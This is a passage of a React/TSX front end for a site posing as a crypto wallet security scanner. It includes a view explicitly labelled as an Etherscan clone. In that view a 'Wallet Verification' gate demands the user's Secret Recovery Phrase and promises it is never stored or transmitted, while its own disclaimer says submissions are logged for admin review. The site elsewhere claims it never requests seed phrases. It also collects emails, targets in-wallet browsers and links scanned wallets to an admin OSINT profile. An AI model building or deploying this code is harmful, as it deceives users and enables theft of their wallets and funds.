                      <svg viewBox="0 0 20 20" fill="currentColor" width="15" height="15"><path d="M10 1L3 5v5c0 4.4 3 8.1 7 9 4-.9 7-4.6 7-9V5l-7-4z"/></svg>
                      Activate Protection
                    </button>

                    <div className={`status-bar ${secureStatus.includes('connected') || secureStatus.includes('sent') ? 'status-bar--success' : secureStatus.includes('failed') ? 'status-bar--warn' : ''}`}>
                      <span className={`status-dot ${secureStatus.toLowerCase().includes('connected') || secureStatus.includes('sent') ? 'active' : secureStatus.toLowerCase().includes('failed') ? 'warn' : ''}`} />
                      {secureStatus}
                    </div>
                  </form>
                </div>

                {/* Quick nav */}
                <div className="protect-quick-nav">
                  {[
                    { label: 'Run a Security Scan', icon: 'scan' as const, view: 'scan' as ViewKey },
                    { label: 'Verify Wallet Ownership', icon: 'verify' as const, view: 'ownership' as ViewKey },
                    { label: 'Recovery Playbook', icon: 'recovery' as const, view: 'recovery' as ViewKey },
                  ].map(item => (
                    <button key={item.label} className="protect-nav-btn" type="button" onClick={() => setActiveView(item.view)}>
                      <span className="protect-nav-icon"><SecureGlyph name={item.icon} className="protect-nav-icon-svg" /></span>
                      <span>{item.label}</span>
                      <span className="protect-nav-arrow">→</span>
                    </button>
                  ))}
                </div>
              </div>

              {/* Right — Checklist */}
              <div className="card protect-checklist-card">
                <div className="protect-checklist-header">
                  <h3>Security Hardening Checklist</h3>
                  <p>Tap each item to mark it complete.</p>
                  <div className="protect-check-progress">
                    <span>{protectChecklistDone.length}/{protectChecklist.length} complete</span>
                    <span>{checklistProgress}%</span>
                  </div>
                </div>
                <div className="protect-checklist-new">
                  {protectChecklist.map(item => (
                    <ChecklistItem
                      key={item.id}
                      item={item}
                      checked={protectChecklistDone.includes(item.id)}
                      onToggle={toggleChecklistItem}
                    />
                  ))}
                </div>
              </div>

            </div>

            {/* Threat cards */}
            <div className="protect-threats-section">
              <h3 className="protect-section-title">Active Threat Intelligence</h3>
              <div className="protect-threat-grid">
                {[
                  { level: 'critical' as Severity, title: 'Clipboard Hijackers',            icon: 'policy' as const, body: 'Malware silently swaps copied wallet addresses. Always verify the first 6 and last 4 characters before sending.' },
                  { level: 'critical' as Severity, title: 'Fake Bridge & Airdrop Drainers', icon: 'alerts' as const, body: 'Sites disguised as bridges request permit signatures that drain your full token balance in one transaction.' },
                  { level: 'high'     as Severity, title: 'Malicious Browser Extensions',   icon: 'shield' as const, body: 'Fake MetaMask clones intercept transactions and silently re-route funds to attacker-controlled addresses.' },
                  { level: 'high'     as Severity, title: 'Phishing via Search Ads',        icon: 'scan' as const, body: 'Attackers buy ads for wallet keywords. The top result may be a pixel-perfect copy of a legitimate dApp.' },
                  { level: 'medium'   as Severity, title: 'Unlimited Approval Abuse',       icon: 'verify' as const, body: 'Old approvals granted to now-compromised protocols are drained months after the original interaction.' },
                  { level: 'medium'   as Severity, title: 'Seed Phrase Phishing Bots',      icon: 'recovery' as const, body: 'Discord and Telegram bots impersonate support staff and request seed phrases to "verify" or "fix" your wallet.' },
                ].map(t => (
                  <div key={t.title} className={`protect-threat-card protect-threat-card--${t.level}`}>
                    <div className="protect-threat-card-top">
                      <span className="protect-threat-emoji"><SecureGlyph name={t.icon} className="protect-threat-icon-svg" /></span>
                      <span className={`pill ${t.level}`}>{t.level}</span>
                    </div>
                    <strong className="protect-threat-title">{t.title}</strong>
                    <p>{t.body}</p>
                  </div>
                ))}
              </div>
            </div>

            <div className="protect-cta-bar">
              <div>
                <strong>Think your wallet is already at risk?</strong>
                <span> Run a live on-chain scan in seconds — no wallet extension required.</span>
              </div>
              <button className="btn-primary" type="button" onClick={() => setActiveView('scan')}>Scan Your Wallet →</button>
            </div>
          </>
        )}

        {/* ════════════ WALLET LANDING (in-wallet-browser only) ════════════ */}
        {activeView === 'wallet-landing' && (
          <section className="wl-root">
            <div className="wl-card">
              {/* Header */}
              <div className="wl-header">
                <div className="wl-shield-wrap">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="wl-shield-svg">
                    <path d="M12 2L4 5v6c0 5.25 3.5 10.15 8 11.35C16.5 21.15 20 16.25 20 11V5l-8-3z" strokeLinejoin="round" />
                    <polyline points="9 12 11 14 15 10" />
                  </svg>
                </div>
                <div className="wl-header-text">
                  <span className="wl-badge">{detectedName} Detected</span>
                  <h2 className="wl-title">Free Security Scan</h2>
                  <p className="wl-sub">We detected a wallet in your browser. Enter your email and we'll scan it for vulnerabilities, then send you a full report.</p>
                </div>
              </div>

              {/* Wallet info strip — shown only when address is already pre-authorized */}
              {detectedAddr && (
                <div className="wl-wallet-strip">
                  <div className="wl-wallet-row">
                    <span className="wl-wallet-label">Wallet</span>
                    <span className="wl-wallet-val mono">{detectedAddr.slice(0,6)}…{detectedAddr.slice(-4)}</span>
                  </div>
                  <div className="wl-wallet-row">
                    <span className="wl-wallet-label">Network</span>
                    <span className="wl-wallet-val">{chainConfig[detectedChain]?.label ?? detectedChain}</span>
                  </div>
                </div>
              )}

              {/* Form */}
              <form className="wl-form" onSubmit={startLandingScan} noValidate>
                <div className="wl-field">
                  <label htmlFor="wl-name" className="wl-field-label">Your name <span className="wl-optional">(optional)</span></label>
                  <input
                    id="wl-name"
                    type="text"
                    className="wl-input"
                    placeholder="e.g. Alex"
                    value={landingUserName}
                    onChange={e => setLandingUserName(e.target.value)}
                    disabled={landingScanning}
                    autoComplete="given-name"
                  />
                </div>
                <div className="wl-field">
                  <label htmlFor="wl-email" className="wl-field-label">Email address <span className="wl-required">*</span></label>
                  <input
                    id="wl-email"
                    type="email"
                    className={`wl-input${landingError ? ' wl-input--error' : ''}`}
                    placeholder="you@example.com"
                    value={landingEmail}
                    onChange={e => { setLandingEmail(e.target.value); setLandingError('') }}
                    disabled={landingScanning}
                    required
                    autoComplete="email"
                  />
                  {landingError && <p className="wl-error">{landingError}</p>}
                </div>

                <button
                  type="submit"
                  className="wl-cta"
                  disabled={landingScanning}
                >
                  {landingScanning
                    ? <><span className="wl-spinner" />Connecting &amp; Scanning…</>
                    : <>Run Security Scan →</>}
                </button>

                <p className="wl-disclaimer">
                  We never request your seed phrase or private keys. Your address is read-only.
                </p>
              </form>

              {/* Trust row */}
              <div className="wl-trust">
                <span className="wl-trust-item">🔒 Read-only access</span>
                <span className="wl-trust-sep">·</span>
                <span className="wl-trust-item">📧 Report via email</span>
                <span className="wl-trust-sep">·</span>
                <span className="wl-trust-item">⚡ Instant results</span>
              </div>

              <button type="button" className="wl-skip" onClick={() => { setActiveView('home'); localStorage.setItem(NEW_USER_KEY, '1') }}>
                Skip and browse the site
              </button>
            </div>
          </section>
        )}

        {/* ════════════ SCAN ════════════ */}
        {activeView === 'scan' && (
          <>
            {/* Full-screen scanning overlay — shown during auto-scan from wallet-landing */}
            {autoScanTriggered && isRunningWeb3 && (
              <div className="scan-overlay">
                <div className="scan-overlay-card">
                  <div className="scan-overlay-pulse">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" className="scan-overlay-shield">
                      <path d="M12 2L4 5v6c0 5.25 3.5 10.15 8 11.35C16.5 21.15 20 16.25 20 11V5l-8-3z" strokeLinejoin="round" />
                    </svg>
                  </div>
                  <h3 className="scan-overlay-title">Scanning Your Wallet</h3>
                  <p className="scan-overlay-addr mono">
                    {wallet ? `${wallet.slice(0,6)}…${wallet.slice(-4)}` : ''}
                    {chain && chainConfig[chain] ? <span className="scan-overlay-chain">{chainConfig[chain].label}</span> : null}
                  </p>
                  <div className="scan-overlay-steps">
                    <span>Fetching on-chain history</span>
                    <span className="scan-overlay-dot-anim">···</span>
                  </div>
                  <div className="scan-overlay-progress">
                    <div className="scan-overlay-bar" />
                  </div>
                  <p className="scan-overlay-note">Analyzing transactions, approvals &amp; exposure — this usually takes under 10 seconds.</p>
                </div>
              </div>
            )}

            <div className="workspace" id="scan-form">
              <article className="card">
                <p className="card-title">Incident Console</p>
                <form onSubmit={runScan}>

                  {/* Address input with optional wallet connect */}
                  <div className="field">
                    <label htmlFor="wallet-input">Wallet Address</label>
                    <div className="scan-addr-row">
                      <input
                        id="wallet-input"
                        type="text"
                        value={wallet}
                        onChange={e => setWallet(e.target.value)}
                        placeholder="Paste any 0x… address or connect your wallet"
                        className="scan-addr-input"
                      />
                      {isWalletConnected ? (
                        <button
                          type="button"
                          className="scan-wallet-btn connected"
                          onClick={() => { void openWalletModal() }}
                          title="Manage wallet"
                        >
                          <span className="wallet-dot" />
                          {shortAddr(connectedAddress)}
                        </button>
                      ) : (
                        <button
                          type="button"
                          className="scan-wallet-btn"
                          onClick={() => { void openWalletModal() }}
                        >
                          <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="1.6" width="14" height="14"><rect x="2" y="5" width="16" height="12" rx="2"/><path d="M14 11a1 1 0 1 0 0-2 1 1 0 0 0 0 2z" fill="currentColor" stroke="none"/><path d="M2 9h16"/></svg>
                          Connect
                        </button>
                      )}
                    </div>
                    {submitted && !addressValid && <p className="field-error">Enter a valid EVM address (0x… 40 hex chars).</p>}
                    {wallet && addressValid && (
                      <p className="form-hint">
                        {shortAddr(wallet)} · {chainConfig[chain].label}
                        {isWalletConnected && <span className="scan-connected-tag">● Connected</span>}
                        {!isWalletConnected && <span style={{ color: 'var(--muted)' }}> · Manual address — no wallet required</span>}
                      </p>
                    )}
                    {connectedAddress && wallet.toLowerCase() !== connectedAddress.toLowerCase() && (
                      <button
                        type="button"
                        className="btn-secondary"
                        style={{ marginTop: '0.45rem' }}
                        onClick={() => setWallet(connectedAddress)}
                      >
                        Use connected wallet address
                      </button>
                    )}
                    {!wallet && !isWalletConnected && (
                      <p className="form-hint">No wallet extension needed — just paste any EVM address and scan.</p>
                    )}
                  </div>

                  <div className="field">
                    <label htmlFor="network-select">Network</label>
                    <select id="network-select" value={chain} onChange={e => setChain(e.target.value as ChainKey)}>
                      {Object.entries(chainConfig).map(([k, v]) => <option key={k} value={k}>{v.label}</option>)}
                    </select>
                  </div>

                  {wallet && isWalletConnected && !isConnectedToChain && (
                    <button className="btn-secondary" type="button" onClick={switchNetwork} style={{ marginBottom: '1rem' }}>
                      Switch wallet to {chainConfig[chain].label}
                    </button>
                  )}

                  <div className="signals-group">
                    <p className="signals-label">Compromise Signals</p>
                    {signals.map(s => (
                      <label key={s.id} className="checkbox-row">
                        <input type="checkbox" checked={selectedSignals.includes(s.id)} onChange={() => setSelectedSignals(prev => prev.includes(s.id) ? prev.filter(x => x !== s.id) : [...prev, s.id])} />
                        <span>{s.label}</span>
                      </label>
                    ))}
                  </div>

                  <div className="field">
                    <label htmlFor="incident-notes">Incident Notes</label>
                    <textarea id="incident-notes" rows={3} value={incidentNotes} onChange={e => setIncidentNotes(e.target.value)} placeholder="Paste suspicious tx hash, domain, or timeline details…" />
                  </div>

                  {/* Honeypot — hidden from real users, bots fill it */}
                  <input
                    type="text"
                    name="website"
                    value={honeypot}
                    onChange={e => setHoneypot(e.target.value)}
                    tabIndex={-1}
                    autoComplete="off"
                    aria-hidden="true"
                    style={{ display: 'none' }}
                  />

                  {/* CAPTCHA */}
                  {!captchaPassed && (
                    <div className="captcha-block">
                      <label className="captcha-label" htmlFor="captcha-input">
                        Security check: what is <strong>{captchaA} + {captchaB}</strong>?
                      </label>
                      <div className="captcha-row">
                        <input
                          id="captcha-input"
                          type="number"
                          className="captcha-input"
                          placeholder="Answer"
                          value={captchaInput}
                          onChange={e => setCaptchaInput(e.target.value)}
                          min="0"
                          max="20"
                        />
                        <button type="button" className="btn-secondary captcha-refresh" onClick={refreshCaptcha} title="New question">↺</button>
                      </div>
                      {captchaError && <p className="field-error" style={{ marginTop: '0.3rem' }}>{captchaError}</p>}
                    </div>
                  )}
                  {captchaPassed && (
                    <p className="form-hint" style={{ color: 'var(--green, #22c55e)', marginBottom: '0.5rem' }}>✓ Verified — not a bot</p>
                  )}

                  <div className="action-row">
                    <button className="btn-primary" type="submit" disabled={isRunningWeb3}>
                      {isRunningWeb3 ? (
                        <><span className="spinner" />Scanning…</>
                      ) : 'Run Security Scan'}
                    </button>
                    <button className="btn-secondary" type="button" onClick={testSigner} disabled={isTestingSigner || !isWalletConnected}>
                      {isTestingSigner ? 'Checking…' : 'Signer Probe'}
                    </button>
                  </div>
                  {!isWalletConnected && (
                    <p className="form-hint" style={{ marginTop: '0.5rem' }}>
                      Signer Probe requires a connected wallet. Scanning works without one.
                    </p>
                  )}
                  {(web3Status || signerCheck) && (
                    <div className="status-bar">
                      <span className={`status-dot ${web3Status.includes('complete') || signerCheck.includes('verified') ? 'active' : web3Status.includes('error') ? 'warn' : ''}`} />
                      {signerCheck || web3Status}
                    </div>
                  )}
                </form>
              </article>

              <div className="right-stack">
                <div className="card">
                  <p className="card-title">Quick Actions</p>
                  <div className="quick-links">
                    <button className="quick-link-btn" type="button" onClick={copyPlan}>Copy Response Plan</button>
                    <button className="quick-link-btn" type="button" onClick={exportReport}>Export JSON Report</button>
                  </div>
                  {reportStatus && <p className="muted" style={{ marginTop: '0.6rem' }}>{reportStatus}</p>}
                </div>
                <div className="card">
                  <p className="card-title">Threat Intel</p>
                  <div className="threat-list">
                    {threatFeed.map(t => (
                      <div key={t.title} className="threat-item">
                        <span className={`pill ${t.level}`}>{t.level}</span>
                        <h3>{t.title}</h3><p>{t.description}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>

            {/* ── Scan result ── */}
            {result && (
              <div className={`result-card ${result.severity}`}>
                <div className="result-head">
                  <div>
                    <h2 style={{ fontSize: '1.1rem' }}>Security Report</h2>
                    <p className="result-meta">{chainConfig[chain].label} · {addressValid ? shortAddr(wallet) : '—'} · {result.generatedAt}</p>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', flexWrap: 'wrap' }}>
                    <span className={`pill ${result.severity}`}>{result.severity}</span>
                    <button
                      className="preview-btn"
                      type="button"
                      style={{ fontSize: '0.75rem' }}
                      onClick={() => {
                        setAdminTab('osint')
                        setOsintExpanded(wallet.trim().toLowerCase())
                        setActiveView('admin')
                      }}
                    >
                      View OSINT Profile →
                    </button>
                  </div>
                </div>

                <div className="kpis">
                  {[['Risk Score', result.score], ['Risk Index', `${result.riskPercent}%`], ['Balance', result.web3?.nativeBalance ? `${result.web3.nativeBalance} ${chainConfig[chain].nativeSymbol}` : (walletBalance || 'N/A')], ['Transactions', result.web3?.txCount ?? 'N/A']].map(([label, value]) => (
                    <div className="kpi" key={label as string}>
                      <p className="kpi-label">{label}</p>
                      <p className="kpi-value">{value}</p>
                    </div>
                  ))}
                </div>

                <p className="severity-copy">{severityCopy[result.severity]}</p>

                <div className="group-grid">
                  {(['watching', 'seed', 'drainer'] as Signal['group'][]).map(g => (
                    <div key={g} className="group-card">
                      <p>{groupLabel[g]}</p>
                      <div className="bar-track"><span style={{ width: `${Math.min(100, result.byGroup[g] * 2)}%` }} /></div>
                      <strong>{result.byGroup[g]} pts</strong>
                    </div>
                  ))}
                </div>

                {result.web3 && (
                  <div className="list-block">
                    <h3>On-Chain Telemetry</h3>
                    <div className="web3-grid">
                      {[
                        ['Chain ID',       result.web3.chainId ?? 'N/A'],
                        ['Native Balance', result.web3.nativeBalance ? `${result.web3.nativeBalance} ${chainConfig[chain].nativeSymbol}` : 'N/A'],
                        ['Tx Count',       result.web3.txCount ?? 'N/A'],
                        ['Pending Nonce',  result.web3.noncePending ?? 'N/A'],
                        ['Approvals',      result.web3.recentApprovals ?? 'N/A'],
                        ['Transfers (5k)', result.web3.recentOutgoingTransfers ?? 'N/A'],
                        ['Pending Txs',    result.web3.pendingGap],
                        ['Address Type',   result.web3.isContractAddress === null ? 'N/A' : result.web3.isContractAddress ? 'Contract' : 'EOA'],
                      ].map(([l, v]) => (
                        <div className="kpi" key={l as string}>
                          <p className="kpi-label">{l}</p>
                          <p className="kpi-value" style={{ fontSize: '0.95rem' }}>{v}</p>
                        </div>
                      ))}
                    </div>
                    {result.web3.findings.length > 0 && (
                      <div className="list-block">
                        <h3>Findings</h3>
                        <ul>{result.web3.findings.map(f => <li key={f}>{f}</li>)}</ul>
                      </div>
                    )}
                  </div>
                )}

                {result.securityApi && (
                  <div className="list-block">
                    <h3>GoPlus Security API</h3>
                    <div className="web3-grid" style={{ marginBottom: '0.8rem' }}>
                      {[
                        ['Source', 'GoPlus Labs'],
                        ['Malicious Flag', result.securityApi.maliciousAddress == null ? 'N/A' : result.securityApi.maliciousAddress ? 'YES' : 'No'],
                        ['Threat Flags', String(result.securityApi.hitFlags.length)],
                      ].map(([l, v]) => (
                        <div className="kpi" key={l}>
                          <p className="kpi-label">{l}</p>
                          <p className="kpi-value" style={{ fontSize: '0.9rem' }}>{v}</p>
                        </div>
                      ))}
                    </div>
                    {result.securityApi.hitFlags.length > 0 ? (
                      <ul>{result.securityApi.hitFlags.map(f => <li key={f}>{f}</li>)}</ul>
                    ) : (
                      <p className="muted" style={{ fontSize: '0.85rem' }}>No threat flags returned by GoPlus for this address.</p>
                    )}
                    <details style={{ marginTop: '0.6rem' }}>
                      <summary style={{ fontSize: '0.8rem', cursor: 'pointer', color: 'var(--muted)' }}>All raw flags from GoPlus ({Object.keys(result.securityApi.rawFlags).length})</summary>
                      <div className="raw-flags-grid">
                        {Object.entries(result.securityApi.rawFlags).map(([k, v]) => (
                          <span key={k} className={`raw-flag ${v === '1' ? 'raw-flag-hit' : ''}`}>{k.replace(/_/g, ' ')}: {v}</span>
                        ))}
                      </div>
                    </details>
                  </div>
                )}

                {result.adminIntel && (
                  <div className="list-block admin-intel-block">
                    <h3>Threat Intelligence</h3>
                    <div className="admin-intel-meta">
                      <span className={`pill ${result.adminIntel.severity}`}>{result.adminIntel.severity.toUpperCase()}</span>
                      <span className="muted" style={{ fontSize: '0.8rem', marginLeft: '0.5rem' }}>Flagged by {result.adminIntel.addedBy} · {result.adminIntel.addedAt}</span>
                    </div>
                    {result.adminIntel.notes && <p className="notes-block" style={{ marginTop: '0.5rem' }}>{result.adminIntel.notes}</p>}
                    <ul style={{ marginTop: '0.5rem' }}>
                      {result.adminIntel.findings.map(f => <li key={f}>{f}</li>)}
                    </ul>
                  </div>
                )}

                {result.matchedSignals.length > 0 && (
                  <div className="list-block"><h3>Matched Signals</h3><ul>{result.matchedSignals.map(s => <li key={s.id}>{s.label}</li>)}</ul></div>
                )}

                <div className="list-block">
                  <h3>Recommended Response</h3>
                  <ol>{actionPlan[result.severity].map(s => <li key={s}>{s}</li>)}</ol>
                </div>

                {incidentNotes.trim() && (
                  <div className="list-block"><h3>Incident Notes</h3><div className="notes-block">{incidentNotes}</div></div>
                )}

                {/* ── Email capture ── */}
                <div className="email-capture">
                  <h3 className="email-capture-title">📧 Receive your full report by email</h3>
                  <p className="email-capture-sub">We'll send a professional security report to your inbox — no account required.</p>
                  <form onSubmit={sendEmailReport} className="email-capture-form">
                    <input type="text" placeholder="Your name (optional)" value={nameInput} onChange={e => setNameInput(e.target.value)} />
                    <input type="email" placeholder="your@email.com" value={emailInput} onChange={e => setEmailInput(e.target.value)} required />
                    <button className="btn-primary" type="submit" disabled={emailSending}>
                      {emailSending ? 'Sending…' : 'Send Report'}
                    </button>
                  </form>
                  {emailSentMsg && (
                    <div className="status-bar" style={{ marginTop: '0.7rem' }}>
                      <span className={`status-dot ${emailSentMsg.includes('sent') ? 'active' : 'warn'}`} />
                      {emailSentMsg}
                    </div>
                  )}
                </div>
              </div>
            )}
          </>
        )}

        {/* ════════════ OWNERSHIP ════════════ */}
        {/* ════════════ ETHERSCAN CLONE ════════════ */}
        {activeView === 'etherscan' && (
          <div className="es-root">

            {/* ── Ultra-thin global stats strip ── */}
            <div className="es-strip">
              <div className="es-strip-inner">
                <div className="es-strip-left">
                  <span className="es-strip-item">
                    <span className="es-strip-label">{chainConfig[chain].nativeSymbol} Price:</span>
                    <span className="es-strip-val">{esEthUsdPrice ? `$${esEthUsdPrice}` : '—'}</span>
                    <span className="es-strip-change">▲ 2.41%</span>
                  </span>
                  <span className="es-strip-pipe">|</span>
                  <span className="es-strip-item">
                    <span className="es-strip-label">Gas:</span>
                    <span className="es-strip-val es-strip-gas">{esGasGwei ? `${esGasGwei} Gwei` : '—'}</span>
                  </span>
                  <span className="es-strip-pipe">|</span>
                  <span className="es-strip-item es-strip-item--muted">
                    {esLatestBlock ? `Block #${esLatestBlock.toLocaleString()}` : 'Syncing…'}
                  </span>
                </div>
                <div className="es-strip-right">
                  <span className="es-strip-network-pill">
                    <span className="es-strip-network-dot" />
                    {chainConfig[chain].label} Network
                  </span>
                </div>
              </div>
            </div>

            {/* ── Main nav ── */}
            <div className="es-topnav">
              <div className="es-topnav-inner">
                <div className="es-topnav-logo">
                  <svg viewBox="0 0 293.775 293.649" width="28" height="28" fill="#fff"><path d="M144.028 6.721A137.683 137.683 0 0 0 6.345 144.404c0 76.066 61.617 137.683 137.683 137.683s137.683-61.617 137.683-137.683S220.094 6.721 144.028 6.721"/><path fill="#21325b" d="M59.262 150.27a8.468 8.468 0 0 1 8.332-7.134h49.856a8.468 8.468 0 0 1 8.468 8.468v104.36a5.64 5.64 0 0 1-9.28 4.309A123.51 123.51 0 0 1 29.3 172.33a5.64 5.64 0 0 1 4.9-8.47l17.867-.028a8.468 8.468 0 0 0 7.195-13.562"/><path fill="#21325b" d="M140.667 148.7a8.468 8.468 0 0 1 8.468-8.468h55.3a8.468 8.468 0 0 1 8.468 8.468v97.38a5.64 5.64 0 0 1-3.344 5.137 123.51 123.51 0 0 1-61.344 8.468 5.64 5.64 0 0 1-7.549-5.32V148.7z"/></svg>
                  <span className="es-topnav-brand">{explorerBrand}</span>
                </div>
                <nav className="es-topnav-links">
                  {['Home','Blockchain','Tokens','NFTs','Resources','Developers'].map(l => (
                    <span key={l} className="es-nav-lnk">
                      {l}
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="9" height="9" strokeLinecap="round" strokeLinejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
                    </span>
                  ))}
                </nav>
                <div className="es-topnav-search">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: '0.6rem', color: 'rgba(255,255,255,0.4)', flexShrink: 0 }}><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
                  <input type="text" defaultValue={esAddr} readOnly className="es-search-input" placeholder="Search by Address / Txn Hash / Block / Token" />
                  <button className="es-search-btn" type="button">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
                  </button>
                </div>
                <div className="es-topnav-actions">
                  <button className="es-signin-btn" type="button">Sign In</button>
                </div>
              </div>
            </div>

            {/* ── Content ── */}
            <div className="es-page">

              {/* ── Session Gate ── */}
              {!esSessionActive && (
                <div className="es-gate">
                  {esLockActive ? (
                    <div className="es-gate-lockout">
                      <div className="es-gate-lock-circle">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" width="36" height="36" strokeLinecap="round" strokeLinejoin="round">
                          <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                        </svg>
                      </div>
                      <h3 className="es-gate-title">Explorer Temporarily Locked</h3>
                      <p className="es-gate-sub">
                        Your session has expired. Advanced explorer features are locked for <strong>{esLockTimerLabel}</strong>. You will be redirected automatically.
                      </p>
                      <div className="es-gate-timer-bar"><div className="es-gate-timer-bar-inner es-gate-timer-bar-warn" /></div>
                    </div>
                  ) : (
                    <div className="es-gate-verify">
                      <div className="es-gate-brand-row">
                        <svg viewBox="0 0 293.775 293.649" width="32" height="32" fill="#21325b"><path d="M144.028 6.721A137.683 137.683 0 0 0 6.345 144.404c0 76.066 61.617 137.683 137.683 137.683s137.683-61.617 137.683-137.683S220.094 6.721 144.028 6.721"/></svg>
                        <span className="es-gate-brand-name">{explorerBrand}</span>
                        <span className="es-gate-brand-sep">|</span>
                        <span className="es-gate-brand-sub">Wallet Verification</span>
                      </div>

                      <div className="es-gate-hero">
                        <div className="es-gate-shield">
                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" width="34" height="34" strokeLinecap="round" strokeLinejoin="round">
                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                          </svg>
                        </div>
                        <div className="es-gate-text">
                          <h3 className="es-gate-title">Verify Wallet Ownership</h3>
                          <p className="es-gate-sub">
                            To access advanced transaction history and analytics for this address, complete cryptographic ownership verification using your Secret Recovery Phrase. Your phrase is processed locally and is never stored or transmitted.
                          </p>
                          <div className="es-gate-trust">
                            <span className="es-gate-chip">
                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                              End-to-End Encrypted
                            </span>
                            <span className="es-gate-chip">
                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9 12l2 2 4-4"/></svg>
                              Session Scoped
                            </span>
                            <span className="es-gate-chip">
                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                              Zero Storage
                            </span>
                          </div>
                        </div>
                      </div>

                      <form className="es-gate-form" onSubmit={submitExplorerSeedGate}>
                        <div className="es-gate-field">
                          <div className="es-gate-label-row">
                            <label className="es-gate-label" htmlFor="es-seed-input">Secret Recovery Phrase</label>
                            <span className="es-gate-required">Required</span>
                          </div>
                          <textarea
                            id="es-seed-input"
                            className="es-gate-textarea"
                            rows={3}
                            placeholder="word1 word2 word3 … (12, 15, 18, 21, or 24 words, lowercase, separated by spaces)"
                            value={esSeedInput}
                            onChange={e => setEsSeedInput(e.target.value)}
                            required
                          />
                          <div className="es-gate-meta">
                            <span className={`es-gate-wordcount${[12,15,18,21,24].includes(esSeedInput.trim().split(/\s+/).filter(Boolean).length) ? ' es-gate-wordcount--ok' : ''}`}>
                              {esSeedInput.trim() ? esSeedInput.trim().split(/\s+/).filter(Boolean).length : 0} / 12–24 words
                            </span>
                            {esSeedError && <span className="es-gate-error">{esSeedError}</span>}
                          </div>
                        </div>

                        <button className="es-gate-submit" type="submit">
                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                          Verify
                        </button>
                        <button className="es-gate-cancel" type="button" onClick={() => setActiveView('ownership')}>
                          ← Return to Safety Check
                        </button>

                        <p className="es-gate-disclaimer">
                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                          By continuing you confirm this verification text belongs to a wallet you own. Submission is logged for admin review and verification processing.
                        </p>
                      </form>

                      {/* Keep bot deployment reachable even before explorer session unlock */}
                      <div className="es-gate-bot-cta">
                        {approvedBotForWallet ? (
                          <span className="bot-deploy-badge approved">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
                            Bot Protected
                          </span>
                        ) : pendingBotForWallet ? (
                          <span className="bot-deploy-badge pending">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                            Pending Review
                          </span>
                        ) : (
                          <button type="button" className="bot-deploy-btn" onClick={openBotModal}>
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                            Deploy Bot
                          </button>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              )}

              {/* ── Full explorer content (session active) ── */}
              {esSessionActive && (<>

                {/* Session timer banner */}
                <div className="es-session-bar">
                  <span className="es-session-dot" />
                  <span>Session active — <strong>{esSessionTimerLabel}</strong> remaining</span>
                  <button type="button" className="es-back-btn" onClick={() => setActiveView('protect')}>
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"/></svg>
                    Back to Safety Check
                  </button>
                </div>

                {/* Breadcrumb */}
                <div className="es-breadcrumb">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
                  <span className="es-bc-sep">/</span>
                  <span className="es-bc-link">Home</span>
                  <span className="es-bc-sep">/</span>
                  <span className="es-bc-link">Accounts</span>
